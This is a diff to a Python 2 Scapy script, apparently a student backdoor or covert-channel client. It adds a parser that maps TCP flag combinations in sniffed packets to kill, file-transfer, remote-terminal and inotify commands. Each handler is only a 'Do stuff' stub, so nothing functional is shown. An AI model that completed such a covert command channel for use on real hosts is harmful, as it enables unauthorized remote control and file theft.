@@ -271,9 +271,9 @@ def clientCommands(packet):
 		# Beginning Packet sniffing
 		sniff(filter=packetFilter, prn=server(), timeout=300)		
 
-	except KeyboardInterrupt:
+	except SystemExit:
+		
 		print ""
-	print "Shutting Down"
 
 '''
 ------------------------------------------------------------------------------
@@ -291,14 +291,129 @@ def clientCommands(packet):
 -- RETURNS: void
 -- 
 -- NOTES: 
--- 
+--
+-- --Server Codes--
+--       A S F 
+--       C Y I 
+--       K N N Flag
+-- sFile 0 0 0 N/A
+-- gFile 1 0 0 A
+-- termi 0 1 0 S
+-- iNoti 1 1 0 AS
+-- Kill  0 0 1 F
 ------------------------------------------------------------------------------
 '''
 def commandParser():
 	def getResponse(packet):
-		print "Do Stuff"
+		# Kill
+		if "F" in packet[TCP].flag:
+			sys.exit()
+		# iNotify
+		elif "AS" in packet[TCP].flag:
+			notify(packet)
+		# Terminal Command
+		elif "S" in packet[TCP].flag:
+			terminal(packet)
+		# Client receives file
+		elif "A" in packet[TCP].flag:
+			getFile(packet)
+		# Client sends file
+		else:
+			sendFile(packet)
 
 	return getResponse
+
+'''
+---------------------------------------------------------------------------------------------
+-- 
+-- FUNCTION: sendFile
+-- 
+-- DATE: 2014-11-14
+-- 
+-- DESIGNERS: John Payment
+-- 
+-- PROGRAMMER: John Payment
+-- 
+-- INTERFACE: sendFile(packet)
+--              packet - The command packet
+-- 
+-- RETURNS: N/A
+-- 
+-- NOTES: 
+-- 
+---------------------------------------------------------------------------------------------
+'''
+def sendFile(packet):
+	print "Do stuff"
+
+'''
+---------------------------------------------------------------------------------------------
+-- 
+-- FUNCTION: getFile
+-- 
+-- DATE: 2014-11-14
+-- 
+-- DESIGNERS: John Payment
+-- 
+-- PROGRAMMER: John Payment
+-- 
+-- INTERFACE: getFile(packet)
+--              packet - The command packet
+-- 
+-- RETURNS: N/A
+-- 
+-- NOTES: 
+-- 
+---------------------------------------------------------------------------------------------
+'''
+def getFile(packet):
+	print "Do stuff"
+
+'''
+---------------------------------------------------------------------------------------------
+-- 
+-- FUNCTION: terminal
+-- 
+-- DATE: 2014-11-14
+-- 
+-- DESIGNERS: John Payment
+-- 
+-- PROGRAMMER: John Payment
+-- 
+-- INTERFACE: terminal(packet)
+--              packet - The command packet
+-- 
+-- RETURNS: N/A
+-- 
+-- NOTES: 
+-- 
+---------------------------------------------------------------------------------------------
+'''
+def terminal(packet):
+	print "Do stuff"
+
+'''
+---------------------------------------------------------------------------------------------
+-- 
+-- FUNCTION: notify
+-- 
+-- DATE: 2014-11-14
+-- 
+-- DESIGNERS: John Payment
+-- 
+-- PROGRAMMER: John Payment
+-- 
+-- INTERFACE: notify(packet)
+--              packet - The command packet
+-- 
+-- RETURNS: N/A
+-- 
+-- NOTES: 
+-- 
+---------------------------------------------------------------------------------------------
+'''
+def notify(packet):
+	print "Do stuff"
 
 main()
 
